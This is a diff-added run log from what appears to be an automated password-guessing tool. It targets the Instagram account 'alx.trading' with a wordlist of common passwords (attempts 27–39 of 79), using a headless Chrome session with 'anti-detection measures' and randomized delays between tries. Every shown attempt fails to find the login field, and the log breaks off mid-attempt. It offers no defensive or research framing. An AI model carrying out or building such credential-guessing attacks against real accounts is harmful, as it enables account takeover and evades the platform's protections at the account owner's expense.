+2025-05-25 09:17:04,010 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:17:04,347 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:17:04,347 - INFO - ✅ Browser session created successfully
+2025-05-25 09:17:04,347 - INFO - Navigating to Instagram...
+2025-05-25 09:17:08,480 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:18:08,639 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:18:08,710 - INFO - ✅ Browser session closed
+2025-05-25 09:18:08,711 - INFO - ✅ Virtual display stopped
+2025-05-25 09:18:08,711 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccc0b0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/f2910d22ba25cebdb2b2a3814e27c3d8
+2025-05-25 09:18:08,712 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0cce4b0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/f2910d22ba25cebdb2b2a3814e27c3d8
+2025-05-25 09:18:08,712 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccfd70>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/f2910d22ba25cebdb2b2a3814e27c3d8
+2025-05-25 09:18:08,713 - INFO - ✅ Browser session closed
+2025-05-25 09:18:08,713 - INFO - ✅ Virtual display stopped
+2025-05-25 09:18:08,713 - INFO - Attempt 27/79: iloveyou
+2025-05-25 09:18:08,713 - INFO - Waiting 9.1s before next attempt...
+2025-05-25 09:18:17,793 - INFO - 🎯 Direct attack: alx.trading:iloveyou
+2025-05-25 09:18:19,794 - INFO - 🖥️ Virtual display started: :14
+2025-05-25 09:18:21,796 - INFO - 🖥️ Virtual display started: :25
+2025-05-25 09:18:21,796 - INFO - Creating chrome browser session...
+2025-05-25 09:18:21,796 - INFO - ====== WebDriver manager ======
+2025-05-25 09:18:21,868 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:18:21,882 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:18:21,892 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:18:22,246 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:18:22,246 - INFO - ✅ Browser session created successfully
+2025-05-25 09:18:22,247 - INFO - Navigating to Instagram...
+2025-05-25 09:18:26,676 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:19:26,846 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:19:26,917 - INFO - ✅ Browser session closed
+2025-05-25 09:19:26,917 - INFO - ✅ Virtual display stopped
+2025-05-25 09:19:26,918 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87fb0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/e261b68a3c4d0d73db35bd8c64e3a565
+2025-05-25 09:19:26,919 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccdbe0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/e261b68a3c4d0d73db35bd8c64e3a565
+2025-05-25 09:19:26,919 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccdd90>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/e261b68a3c4d0d73db35bd8c64e3a565
+2025-05-25 09:19:26,920 - INFO - ✅ Browser session closed
+2025-05-25 09:19:26,920 - INFO - ✅ Virtual display stopped
+2025-05-25 09:19:26,920 - INFO - Attempt 28/79: princess
+2025-05-25 09:19:26,920 - INFO - Waiting 10.2s before next attempt...
+2025-05-25 09:19:37,077 - INFO - 🎯 Direct attack: alx.trading:princess
+2025-05-25 09:19:39,079 - INFO - 🖥️ Virtual display started: :97
+2025-05-25 09:19:41,080 - INFO - 🖥️ Virtual display started: :57
+2025-05-25 09:19:41,080 - INFO - Creating chrome browser session...
+2025-05-25 09:19:41,080 - INFO - ====== WebDriver manager ======
+2025-05-25 09:19:41,156 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:19:41,168 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:19:41,180 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:19:41,535 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:19:41,536 - INFO - ✅ Browser session created successfully
+2025-05-25 09:19:41,536 - INFO - Navigating to Instagram...
+2025-05-25 09:19:45,567 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:20:45,753 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:20:45,826 - INFO - ✅ Browser session closed
+2025-05-25 09:20:45,826 - INFO - ✅ Virtual display stopped
+2025-05-25 09:20:45,827 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c878f0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/5dfa6c96d6ee620f1ef9951f70de602e
+2025-05-25 09:20:45,827 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccdee0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/5dfa6c96d6ee620f1ef9951f70de602e
+2025-05-25 09:20:45,828 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccfb00>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/5dfa6c96d6ee620f1ef9951f70de602e
+2025-05-25 09:20:45,828 - INFO - ✅ Browser session closed
+2025-05-25 09:20:45,829 - INFO - ✅ Virtual display stopped
+2025-05-25 09:20:45,829 - INFO - Attempt 29/79: rockyou
+2025-05-25 09:20:45,829 - INFO - Waiting 6.7s before next attempt...
+2025-05-25 09:20:52,567 - INFO - 🎯 Direct attack: alx.trading:rockyou
+2025-05-25 09:20:54,568 - INFO - 🖥️ Virtual display started: :76
+2025-05-25 09:20:56,570 - INFO - 🖥️ Virtual display started: :11
+2025-05-25 09:20:56,570 - INFO - Creating chrome browser session...
+2025-05-25 09:20:56,570 - INFO - ====== WebDriver manager ======
+2025-05-25 09:20:56,639 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:20:56,652 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:20:56,661 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:20:57,008 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:20:57,009 - INFO - ✅ Browser session created successfully
+2025-05-25 09:20:57,009 - INFO - Navigating to Instagram...
+2025-05-25 09:21:01,261 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:22:01,494 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:22:01,567 - INFO - ✅ Browser session closed
+2025-05-25 09:22:01,567 - INFO - ✅ Virtual display stopped
+2025-05-25 09:22:01,568 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccd430>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/6fcb34c08a14256335e6736240afd396
+2025-05-25 09:22:01,568 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccd910>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/6fcb34c08a14256335e6736240afd396
+2025-05-25 09:22:01,569 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0cce690>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/6fcb34c08a14256335e6736240afd396
+2025-05-25 09:22:01,569 - INFO - ✅ Browser session closed
+2025-05-25 09:22:01,569 - INFO - ✅ Virtual display stopped
+2025-05-25 09:22:01,569 - INFO - Attempt 30/79: 654321
+2025-05-25 09:22:01,569 - INFO - Waiting 11.5s before next attempt...
+2025-05-25 09:22:13,076 - INFO - 🎯 Direct attack: alx.trading:654321
+2025-05-25 09:22:15,077 - INFO - 🖥️ Virtual display started: :68
+2025-05-25 09:22:17,079 - INFO - 🖥️ Virtual display started: :10
+2025-05-25 09:22:17,079 - INFO - Creating chrome browser session...
+2025-05-25 09:22:17,079 - INFO - ====== WebDriver manager ======
+2025-05-25 09:22:17,150 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:22:17,165 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:22:17,176 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:22:17,527 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:22:17,527 - INFO - ✅ Browser session created successfully
+2025-05-25 09:22:17,528 - INFO - Navigating to Instagram...
+2025-05-25 09:22:23,561 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:23:23,837 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:23:23,913 - INFO - ✅ Browser session closed
+2025-05-25 09:23:23,913 - INFO - ✅ Virtual display stopped
+2025-05-25 09:23:23,914 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c877d0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/60c83383a1533e23db10d8550ed7c6f1
+2025-05-25 09:23:23,915 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87050>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/60c83383a1533e23db10d8550ed7c6f1
+2025-05-25 09:23:23,915 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d13bf500>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/60c83383a1533e23db10d8550ed7c6f1
+2025-05-25 09:23:23,916 - INFO - ✅ Browser session closed
+2025-05-25 09:23:23,916 - INFO - ✅ Virtual display stopped
+2025-05-25 09:23:23,916 - INFO - Attempt 31/79: jordan23
+2025-05-25 09:23:23,916 - INFO - Waiting 9.0s before next attempt...
+2025-05-25 09:23:32,927 - INFO - 🎯 Direct attack: alx.trading:jordan23
+2025-05-25 09:23:34,928 - INFO - 🖥️ Virtual display started: :90
+2025-05-25 09:23:36,930 - INFO - 🖥️ Virtual display started: :63
+2025-05-25 09:23:36,930 - INFO - Creating chrome browser session...
+2025-05-25 09:23:36,930 - INFO - ====== WebDriver manager ======
+2025-05-25 09:23:36,999 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:23:37,011 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:23:37,024 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:23:37,356 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:23:37,356 - INFO - ✅ Browser session created successfully
+2025-05-25 09:23:37,357 - INFO - Navigating to Instagram...
+2025-05-25 09:23:42,212 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:24:42,433 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:24:42,511 - INFO - ✅ Browser session closed
+2025-05-25 09:24:42,511 - INFO - ✅ Virtual display stopped
+2025-05-25 09:24:42,512 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c86e70>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/d90ebafaebaf1948051bcbe3f8b89290
+2025-05-25 09:24:42,512 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c871a0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/d90ebafaebaf1948051bcbe3f8b89290
+2025-05-25 09:24:42,513 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c5eae0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/d90ebafaebaf1948051bcbe3f8b89290
+2025-05-25 09:24:42,513 - INFO - ✅ Browser session closed
+2025-05-25 09:24:42,514 - INFO - ✅ Virtual display stopped
+2025-05-25 09:24:42,514 - INFO - Attempt 32/79: passw0rd
+2025-05-25 09:24:42,514 - INFO - Waiting 8.9s before next attempt...
+2025-05-25 09:24:51,423 - INFO - 🎯 Direct attack: alx.trading:passw0rd
+2025-05-25 09:24:53,425 - INFO - 🖥️ Virtual display started: :97
+2025-05-25 09:24:55,426 - INFO - 🖥️ Virtual display started: :17
+2025-05-25 09:24:55,426 - INFO - Creating chrome browser session...
+2025-05-25 09:24:55,426 - INFO - ====== WebDriver manager ======
+2025-05-25 09:24:55,496 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:24:55,507 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:24:55,517 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:24:55,904 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:24:55,905 - INFO - ✅ Browser session created successfully
+2025-05-25 09:24:55,905 - INFO - Navigating to Instagram...
+2025-05-25 09:25:00,177 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:26:00,425 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:26:00,503 - INFO - ✅ Browser session closed
+2025-05-25 09:26:00,504 - INFO - ✅ Virtual display stopped
+2025-05-25 09:26:00,504 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87140>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/dd41413435965ce32b47a191191504b6
+2025-05-25 09:26:00,505 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c86d80>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/dd41413435965ce32b47a191191504b6
+2025-05-25 09:26:00,506 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c86d20>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/dd41413435965ce32b47a191191504b6
+2025-05-25 09:26:00,506 - INFO - ✅ Browser session closed
+2025-05-25 09:26:00,506 - INFO - ✅ Virtual display stopped
+2025-05-25 09:26:00,506 - INFO - Attempt 33/79: superman
+2025-05-25 09:26:00,506 - INFO - Waiting 7.3s before next attempt...
+2025-05-25 09:26:07,850 - INFO - 🎯 Direct attack: alx.trading:superman
+2025-05-25 09:26:09,852 - INFO - 🖥️ Virtual display started: :67
+2025-05-25 09:26:11,853 - INFO - 🖥️ Virtual display started: :88
+2025-05-25 09:26:11,853 - INFO - Creating chrome browser session...
+2025-05-25 09:26:11,853 - INFO - ====== WebDriver manager ======
+2025-05-25 09:26:11,924 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:26:11,938 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:26:11,948 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:26:12,291 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:26:12,291 - INFO - ✅ Browser session created successfully
+2025-05-25 09:26:12,291 - INFO - Navigating to Instagram...
+2025-05-25 09:26:16,404 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:27:16,691 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:27:16,766 - INFO - ✅ Browser session closed
+2025-05-25 09:27:16,767 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c86cf0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/f4b567a8e4299bc05067181b4b043c7d
+2025-05-25 09:27:16,768 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87470>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/f4b567a8e4299bc05067181b4b043c7d
+2025-05-25 09:27:16,768 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccd880>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/f4b567a8e4299bc05067181b4b043c7d
+2025-05-25 09:27:16,769 - INFO - ✅ Browser session closed
+2025-05-25 09:27:16,769 - INFO - Attempt 34/79: naruto
+2025-05-25 09:27:16,769 - INFO - Waiting 7.1s before next attempt...
+2025-05-25 09:27:23,898 - INFO - 🎯 Direct attack: alx.trading:naruto
+2025-05-25 09:27:25,899 - INFO - 🖥️ Virtual display started: :81
+2025-05-25 09:27:27,901 - INFO - 🖥️ Virtual display started: :31
+2025-05-25 09:27:27,901 - INFO - Creating chrome browser session...
+2025-05-25 09:27:27,901 - INFO - ====== WebDriver manager ======
+2025-05-25 09:27:27,970 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:27:27,981 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:27:27,992 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:27:28,375 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:27:28,375 - INFO - ✅ Browser session created successfully
+2025-05-25 09:27:28,375 - INFO - Navigating to Instagram...
+2025-05-25 09:27:32,304 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:28:32,446 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:28:32,516 - INFO - ✅ Browser session closed
+2025-05-25 09:28:32,517 - INFO - ✅ Virtual display stopped
+2025-05-25 09:28:32,518 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87380>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/1b1ab39863b7314ee5773ca704fa912c
+2025-05-25 09:28:32,519 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccd760>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/1b1ab39863b7314ee5773ca704fa912c
+2025-05-25 09:28:32,519 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccdbe0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/1b1ab39863b7314ee5773ca704fa912c
+2025-05-25 09:28:32,520 - INFO - ✅ Browser session closed
+2025-05-25 09:28:32,520 - INFO - ✅ Virtual display stopped
+2025-05-25 09:28:32,520 - INFO - Attempt 35/79: pokemon
+2025-05-25 09:28:32,520 - INFO - Waiting 6.0s before next attempt...
+2025-05-25 09:28:38,510 - INFO - 🎯 Direct attack: alx.trading:pokemon
+2025-05-25 09:28:40,511 - INFO - 🖥️ Virtual display started: :38
+2025-05-25 09:28:42,512 - INFO - 🖥️ Virtual display started: :58
+2025-05-25 09:28:42,512 - INFO - Creating chrome browser session...
+2025-05-25 09:28:42,513 - INFO - ====== WebDriver manager ======
+2025-05-25 09:28:42,582 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:28:42,597 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:28:42,607 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:28:42,970 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:28:42,970 - INFO - ✅ Browser session created successfully
+2025-05-25 09:28:42,970 - INFO - Navigating to Instagram...
+2025-05-25 09:28:46,935 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:29:47,154 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:29:47,230 - INFO - ✅ Browser session closed
+2025-05-25 09:29:47,231 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c877d0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/6fa760fae6a6d0d113c5f4676e8a9fbc
+2025-05-25 09:29:47,232 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0cce420>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/6fa760fae6a6d0d113c5f4676e8a9fbc
+2025-05-25 09:29:47,232 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccd430>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/6fa760fae6a6d0d113c5f4676e8a9fbc
+2025-05-25 09:29:47,233 - INFO - ✅ Browser session closed
+2025-05-25 09:29:47,233 - INFO - Attempt 36/79: shadow
+2025-05-25 09:29:47,233 - INFO - Waiting 6.4s before next attempt...
+2025-05-25 09:29:53,651 - INFO - 🎯 Direct attack: alx.trading:shadow
+2025-05-25 09:29:55,652 - INFO - 🖥️ Virtual display started: :98
+2025-05-25 09:29:57,654 - INFO - 🖥️ Virtual display started: :50
+2025-05-25 09:29:57,654 - INFO - Creating chrome browser session...
+2025-05-25 09:29:57,654 - INFO - ====== WebDriver manager ======
+2025-05-25 09:29:57,725 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:29:57,734 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:29:57,746 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:29:58,072 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:29:58,072 - INFO - ✅ Browser session created successfully
+2025-05-25 09:29:58,072 - INFO - Navigating to Instagram...
+2025-05-25 09:30:02,713 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:31:02,926 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:31:02,998 - INFO - ✅ Browser session closed
+2025-05-25 09:31:02,999 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccdca0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/0a166cccfe31a19978cfd1b5f0748826
+2025-05-25 09:31:03,000 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0cce2a0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/0a166cccfe31a19978cfd1b5f0748826
+2025-05-25 09:31:03,000 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccd8e0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/0a166cccfe31a19978cfd1b5f0748826
+2025-05-25 09:31:03,001 - INFO - ✅ Browser session closed
+2025-05-25 09:31:03,001 - INFO - Attempt 37/79: master
+2025-05-25 09:31:03,001 - INFO - Waiting 9.3s before next attempt...
+2025-05-25 09:31:12,343 - INFO - 🎯 Direct attack: alx.trading:master
+2025-05-25 09:31:14,345 - INFO - 🖥️ Virtual display started: :72
+2025-05-25 09:31:16,346 - INFO - 🖥️ Virtual display started: :92
+2025-05-25 09:31:16,347 - INFO - Creating chrome browser session...
+2025-05-25 09:31:16,347 - INFO - ====== WebDriver manager ======
+2025-05-25 09:31:16,416 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:31:16,429 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:31:16,439 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:31:16,810 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:31:16,810 - INFO - ✅ Browser session created successfully
+2025-05-25 09:31:16,811 - INFO - Navigating to Instagram...
+2025-05-25 09:31:22,339 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:32:22,496 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:32:22,570 - INFO - ✅ Browser session closed
+2025-05-25 09:32:22,570 - INFO - ✅ Virtual display stopped
+2025-05-25 09:32:22,571 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccd760>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/ae84eec5495688271ec22d0ca5344008
+2025-05-25 09:32:22,571 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccd340>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/ae84eec5495688271ec22d0ca5344008
+2025-05-25 09:32:22,572 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccdf40>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/ae84eec5495688271ec22d0ca5344008
+2025-05-25 09:32:22,573 - INFO - ✅ Browser session closed
+2025-05-25 09:32:22,573 - INFO - ✅ Virtual display stopped
+2025-05-25 09:32:22,573 - INFO - Attempt 38/79: freedom
+2025-05-25 09:32:22,573 - INFO - Waiting 6.0s before next attempt...
+2025-05-25 09:32:28,570 - INFO - 🎯 Direct attack: alx.trading:freedom
+2025-05-25 09:32:30,571 - INFO - 🖥️ Virtual display started: :79
+2025-05-25 09:32:32,572 - INFO - 🖥️ Virtual display started: :54
+2025-05-25 09:32:32,573 - INFO - Creating chrome browser session...
+2025-05-25 09:32:32,573 - INFO - ====== WebDriver manager ======
+2025-05-25 09:32:32,645 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:32:32,655 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:32:32,665 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:32:33,030 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:32:33,030 - INFO - ✅ Browser session created successfully
+2025-05-25 09:32:33,030 - INFO - Navigating to Instagram...
+2025-05-25 09:32:38,576 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:33:38,822 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:33:38,893 - INFO - ✅ Browser session closed
+2025-05-25 09:33:38,894 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccdbb0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/bd3b0fe82059d4d73a807ccaaabb81bf
+2025-05-25 09:33:38,895 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccdaf0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/bd3b0fe82059d4d73a807ccaaabb81bf
+2025-05-25 09:33:38,895 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccc1d0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/bd3b0fe82059d4d73a807ccaaabb81bf
+2025-05-25 09:33:38,896 - INFO - ✅ Browser session closed
+2025-05-25 09:33:38,896 - INFO - Attempt 39/79: whatever
+2025-05-25 09:33:38,896 - INFO - Waiting 14.5s before next attempt...
+2025-05-25 09:33:53,364 - INFO - 🎯 Direct attack: alx.trading:whatever
+2025-05-25 09:33:55,366 - INFO - 🖥️ Virtual display started: :17
